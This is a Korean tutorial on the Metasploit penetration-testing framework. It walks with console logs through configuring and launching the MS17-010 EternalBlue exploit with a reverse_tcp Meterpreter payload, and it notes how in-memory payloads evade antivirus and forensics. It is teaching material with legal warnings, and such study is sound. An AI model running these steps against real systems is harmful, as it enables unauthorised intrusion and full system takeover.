아키텍처 개요 (Architecture Overview)

Metasploit(메타스플로잇)은 전 세계적으로 가장 많이 사용되는 Penetration Testing (페너트레이션 테스팅, 침투 테스트 및 모의 해킹) 플랫폼입니다. 대상 시스템의 취약점을 탐지하고, 실제 공격 코드를 실행하여 보안 상태를 점검하는 데 최적화되어 있습니다. 무료 오픈소스 버전과 상용 프로 버전이 존재하며, 실무 보안 점검의 표준 도구로 자리매김하고 있습니다.

주요 모듈 구성 (Core Modules)

Metasploit은 기능별로 모듈화(Modularized)되어 있어 높은 확장성을 제공합니다. 모듈 구조를 이해하는 것은 프레임워크를 자유자재로 다루기 위한 첫걸음입니다.

ATTACK

Exploit

(익스플로잇, 취약점 공격 코드)
대상 시스템의 운영체제, 애플리케이션, 또는 네트워크 서비스의 약점(Bug)이나 설계 결함을 이용하여 시스템 권한을 획득하는 실제 공격 코드입니다.

EXECUTE

Payload

(페이로드, 공격 수행 코드)
익스플로잇을 통해 침투에 성공한 직후, 대상 시스템의 메모리나 디스크에서 실행될 동작(예: 리버스 쉘 연결, 백도어 설치, 사용자 계정 추가 등)을 정의합니다.

SCAN

Auxiliary

(옥질리어리, 보조 도구)
익스플로잇처럼 쉘(Shell)을 획득하지는 않지만, 스캐닝(Scanning), 스니핑(Sniffing), 포트 스캔, 서비스 거부 공격(DoS) 등 정보 수집과 보조 작업을 돕는 모듈입니다.

CONTROL

Post

(포스트, 침투 후 작업)
시스템 침투 성공 및 세션 획득 이후, 시스템 내부 정보 수집, 권한 상승(Privilege Escalation), 해시 덤프(Hash Dump), 로그 삭제 등 후속 작업을 수행합니다.

EVADE

Encoder

(인코더, 암호화/난독화 도구)
백신(Anti-Virus)이나 IDS/IPS의 시그니처 기반 탐지를 회피하기 위해 페이로드의 형태를 변조하고 난독화(Obfuscation)하는 역할을 수행합니다.

* IDS/IPS (Intrusion Detection/Prevention System, 침입 탐지/방지 시스템): 네트워크나 시스템의 비정상적인 트래픽과 활동을 모니터링하고 실시간으로 차단하는 엔터프라이즈 보안 솔루션입니다.
* DoS (Denial of Service, 서비스 거부 공격): 타겟 시스템의 네트워크 대역폭이나 메모리 등 리소스를 고갈시켜 정상적인 서비스 제공을 불가능하게 만드는 공격 기법입니다.

기본 사용 흐름 심층 분석 (Step-by-Step Implementation & Logs)

모의 해킹의 표준 절차인 정보 수집 → 취약점 탐색 → 공격 설정 → 침투 성공 과정을 MSF 내부 명령어로 구현한 상세 로그와 해설입니다. 각 출력 줄(Line)이 내포하는 아키텍처적 의미를 정확히 이해해야 합니다.

01

서비스 실행 및 DB 연결 초기화

터미널에서 메타스플로잇을 실행하기 전, PostgreSQL (포스트그레스큐엘) 데이터베이스를 초기화하여 Nmap 스캔 결과와 세션 기록을 저장할 준비를 합니다. 이후 msfconsole을 실행합니다. 네트워크 소켓 제어를 위해 루트(root) 권한이 필수적입니다.

kali@attacker:~$ sudo msfdb init
[i] Database already started [+] Creating database user 'msf' [+] Creating databases 'msf' [+] Creating databases 'msf_test' [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml' [+] Creating initial database schema
kali@attacker:~$ sudo msfconsole -q
=[ metasploit v6.3.20-dev ] + -- --=[ 2335 exploits - 1220 auxiliary - 413 post ] + -- --=[ 1386 payloads - 46 encoders - 11 nops ] + -- --=[ 9 evasion ] Metasploit tip: View all productivity tips with the tip command msf6 > db_status [*] Connected to msf. Connection type: postgresql.

출력 로그 상세 해설

  • sudo msfdb init : Metasploit이 사용할 백엔드 데이터베이스를 생성하고 초기 스키마(Schema)를 구성합니다. 이를 통해 수집된 크리덴셜(Credentials)과 호스트 정보를 영구적으로 저장할 수 있습니다.
  • msfconsole -q : -q (Quiet) 옵션은 시작 시 출력되는 거대한 ASCII 배너 아트를 생략하여 로딩 속도를 높이고 화면을 깔끔하게 유지합니다.
  • db_status : 현재 데이터베이스가 정상적으로 연결(Connected)되었는지 검증합니다. 실무에서는 이 연결 상태를 확인하는 것이 가장 첫 번째 루틴입니다.
02

취약점 모듈 검색 및 로드

공격할 대상의 취약점(예: Windows SMB 취약점인 MS17-010 EternalBlue)을 search 명령어로 검색합니다. 출력되는 테이블을 분석하여 가장 신뢰성 높은 모듈을 선택하고 use 명령어로 메모리에 로드합니다.

msf6 > search type:exploit name:ms17_010
Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) >

출력 로그 상세 해설

  • search type:exploit : 수천 개의 모듈 중 exploit 타입만 필터링하여 검색 결과를 최적화합니다.
  • Rank (등급) : 익스플로잇의 안정성을 나타냅니다. Excellent나 Great는 블루스크린(BSoD) 등 시스템 장애를 일으킬 확률이 적음을 의미합니다. EternalBlue 모듈은 average(보통) 등급이므로 공격 시 시스템 크래시(Crash) 위험이 존재함을 분석가가 인지해야 합니다.
  • Check (사전 검증) : Yes로 표기된 경우, 실제 공격을 수행하기 전 check 명령어를 통해 타겟이 이 취약점에 노출되어 있는지 안전하게 사전 스캔할 수 있는 기능을 제공한다는 뜻입니다.
  • use 0 : 긴 모듈 경로를 다 치지 않고, 인덱스 번호(0)를 사용하여 빠르게 모듈을 로드하는 실무 단축 명령어입니다. 로드 직후 reverse_tcp 페이로드가 자동으로 기본 할당됩니다.
03

환경 변수(Options) 및 Payload 상세 설정

show options를 통해 필수 설정값(Required: yes) 중 비어 있는 항목을 찾습니다. RHOSTS (Remote Hosts, 타겟 IP)와 LHOST (Local Host, 공격자 IP)를 설정하여 통신 경로를 정의합니다.

msf6 exploit(ms17_010_eternalblue) > show options
Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit... RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.1.50 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST eth0
LHOST => 192.168.1.50

출력 로그 상세 해설

  • RPORT 445 : SMB(Server Message Block) 프로토콜이 동작하는 기본 포트입니다. 파일 및 프린터 공유를 위한 윈도우 핵심 서비스 포트입니다.
  • LHOST eth0 : 직접 IP(192.168.1.50)를 입력해도 되지만, 칼리 리눅스의 네트워크 인터페이스 이름인 eth0를 입력하면 프레임워크가 현재 할당된 IP를 동적으로 파악하여 바인딩(Binding)해주는 고급 테크닉입니다.
  • reverse_tcp (리버스 TCP) : 타겟 서버가 방화벽(Firewall)으로 인바운드 연결을 차단하고 있을 때, 타겟 내부에서 공격자의 PC(LHOST)를 향해 거꾸로 아웃바운드 연결을 맺도록 유도하여 방화벽을 우회하는 페이로드 방식입니다.
04

Exploitation (취약점 공격 실행 및 권한 탈취)

모든 변수 할당이 완료되면 exploit 명령어를 입력하여 네트워크 패킷을 전송합니다. 메모리 오염(Pool Corruption) 기법을 통해 대상 커널 영역을 변조하고, 백그라운드 핸들러가 역방향 쉘을 받아들여 Meterpreter (미터프리터) 세션을 생성합니다.

출력 로그 상세 해설

  • Started reverse TCP handler : 공격자 PC에서 타겟의 역방향 연결을 기다리는 리스닝 데몬(Port 4444)이 백그라운드에 구동되었음을 의미합니다.
  • non-paged pool grooming : EternalBlue 익스플로잇의 핵심 원리입니다. 커널의 메모리 풀을 특정 크기로 조작(Grooming)하여, 이후 전송할 악성 페이로드가 정확한 메모리 주소에 덮어씌워지도록 유도하는 고도의 기법입니다.
  • overwrite completed successfully : 타겟 서버의 메모리 구조를 공격자가 의도한 대로 성공적으로 변조(Overwrite)했음을 알리는 치명적인 로그입니다.
  • Meterpreter session 1 opened : 일반적인 텍스트 쉘(cmd.exe)이 아닌, 동적 라이브러리(DLL) 인젝션 방식으로 구동되는 강력한 해킹 전용 대화형 쉘을 획득했습니다.
  • NT AUTHORITY\SYSTEM : getuid 명령 확인 결과, 관리자(Administrator)를 뛰어넘는 윈도우 운영체제 최고 권한인 시스템(SYSTEM) 권한을 획득했습니다. 이는 대상 서버가 완전히 장악되었음을 의미합니다.

침투 테스트 결과 보고서 생성 아키텍처 (Reporting & Log Export)

기업 대상 모의 해킹 업무(Penetration Testing)에서 공격 성공 여부만큼 중요한 것이 객관적인 증빙 자료(Evidence) 확보와 보고서(Report) 작성입니다. 터미널의 모든 입출력 내역을 텍스트로 보존하는 Spool 기능과, DB에 누적된 호스트/포트 정보를 XML 포맷으로 추출하는 방법을 실증합니다.

1. Spool (스풀, 터미널 입출력 영구 저장)

모의 해킹을 시작하기 전 콘솔 진입 직후 spool 명령어를 활성화하면, 이후 화면에 출력되는 모든 명령어와 결과값(성공/실패 로그 모두 포함)이 지정된 텍스트 파일에 실시간으로 기록됩니다. 법적 분쟁 시 수행 내역을 증명하는 결정적 근거 자료가 됩니다.

msf6 > spool /root/PT_Project_Log_20260319.txt
[*] Spooling to file /root/PT_Project_Log_20260319.txt...
msf6 > # 이후 발생하는 모든 공격 로그가 해당 파일에 저장됩니다.
msf6 > spool off
[*] Spooling stopped.

2. DB Export (데이터베이스 메타데이터 추출)

Nmap을 연동하여 스캔한 포트 정보, 탐지된 운영체제 배너, 획득한 암호 해시(Hashes) 등 구조화된 데이터는 PostgreSQL에 저장됩니다. 이를 취약점 분석 보고서(Word/PDF)에 삽입하기 위해 XML 포맷으로 일괄 추출합니다.

msf6 > workspace -a Project_TargetA # 독립된 프로젝트 공간 생성
[*] Added workspace: Project_TargetA
msf6 > hosts # DB에 기록된 타겟 정보 확인
Hosts ===== address mac name os_name os_flavor os_sp purpose info ------- --- ---- ------- --------- ----- ------- ---- 192.168.1.100 00:0c:29:ab:cd:ef Windows 7 Enterprise SP1 client Vulnerable
msf6 > db_export -f xml /root/TargetA_Vulnerability_Report.xml
[*] Starting export of workspace Project_TargetA to /root/TargetA_Vulnerability_Report.xml [xml]... [*] Finished export of workspace Project_TargetA to /root/TargetA_Vulnerability_Report.xml [xml].

아키텍트 인사이트 (Expert Insight)

실무 활용 팁: Meterpreter In-Memory 특성

Meterpreter(미터프리터)는 전통적인 악성코드와 달리 하드디스크에 어떠한 흔적(File)도 남기지 않습니다. 시스템의 RAM(메모리) 상에서 DLL 인젝션(DLL Injection) 방식으로만 동작하기 때문에, 파일 시스템 스캔에 의존하는 안티바이러스 솔루션을 우회할 수 있으며 포렌식(Forensics) 추적을 극도로 어렵게 만드는 고도화된 페이로드입니다.

법적 고지 및 테스트 환경 주의사항

Metasploit 프레임워크는 실존하는 파괴적인 해킹 공격 도구입니다. 명시적으로 문서화된 허가를 받지 않은 타인의 시스템, 또는 기업의 퍼블릭 클라우드 서비스(AWS EC2 등)를 대상으로 해당 도구를 사용할 경우, 정보통신망법(정보통신망 이용촉진 및 정보보호 등에 관한 법률) 제48조 위반으로 무거운 형사 처벌을 받게 됩니다.

※ 특히 AWS 환경에서 사전 허가 없이 침투 테스트를 진행할 경우 계정 영구 정지 및 클라우드 서비스 사업자(CSP) 측의 직접적인 법적 대응이 발생할 수 있습니다.

* PostgreSQL (포스트그레스큐엘): 확장성과 표준 준수를 강조하는 강력한 오픈 소스 객체-관계형 데이터베이스 시스템(ORDBMS)입니다. MSF의 백엔드 DB로 사용됩니다.
* In-Memory Execution (인메모리 실행): 디스크에 파일을 쓰지 않고 RAM 메모리 공간 내에서만 프로그램 코드를 실행하여 보안 소프트웨어의 탐지를 우회하는 Fileless 공격 기술입니다.
* XML (eXtensible Markup Language): 데이터를 정의하고 전달하기 위해 사용하는 마크업 언어로, 추출된 침투 테스트 데이터를 타 보안 솔루션(예: Nexpose, Nessus)이나 리포트 자동화 도구에 연동할 때 널리 쓰입니다.
